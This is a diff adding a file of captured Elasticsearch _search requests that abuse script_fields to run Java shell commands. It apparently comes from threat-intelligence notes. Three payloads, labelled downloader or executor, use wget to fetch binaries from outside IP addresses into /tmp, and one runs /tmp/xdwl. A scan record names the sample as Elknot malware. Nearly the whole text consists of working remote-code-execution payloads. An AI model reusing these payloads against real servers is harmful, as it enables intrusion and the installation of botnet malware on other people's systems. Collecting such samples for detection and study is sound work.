@@ -1,0 +1,20 @@
+Downloader / Executor:
+
+{"query":+{"filtered":+{"query":+{"match_all":+{}}}},+"script_fields":+{"exp":+{"script":+"import+java.util.*;import+java.io.*;String+str+=+\"\";BufferedReader+br+=+new+BufferedReader(new+InputStreamReader(Runtime.getRuntime().exec(\"wget+-O+/tmp/Sekey+http://222..x.y.z:5665/Sekey\").getInputStream()));StringBuilder+sb+=+new+StringBuilder();while((str=br.readLine())!=null){sb.append(str);sb.append(\"\r\n\");}sb.toString();"}},+"size":+1}
+
+Downloader:
+
+/_search?source={"query": {"filtered": {"query": {"match_all": {}}}}, "script_fields": {"exp": {"script": "import java.util.*;import java.io.*;String str = \"\";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\"wget -O /tmp/System http://183.60.202.80:2323/System\").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str);sb.append(\"\r\n\");}sb.toString();"}}, "size": 1}
+
+Downloader:
+
+/_search?source={"size":1,"query":{"filtered":{"query":{"match_all":{}}}},"script_fields":{"exp":{"script":"import java.util.*;\nimport java.io.*;\nString str = \"\";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\"wget -O /tmp/xdwl http://198.15.216.27:2015/xdwl\").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();"}}}
+
+SHA256:	3aa79b6e1ba9d2f7fe540db4d02a09c98aade4058658c8a28c337282994e52b9
+File name:	xdwl.Elknot.Packed-Stripped.mmd
+Detection ratio:	26 / 57
+Analysis date:	2015-09-21 18:23:33 UTC ( 2 weeks, 3 days ago )
+
+Executer:
+
+/_search?source={"size":1,"query":{"filtered":{"query":{"match_all":{}}}},"script_fields":{"exp":{"script":"import java.util.*;\nimport java.io.*;\nString str = \"\";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\"/tmp/xdwl\").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();"}}}
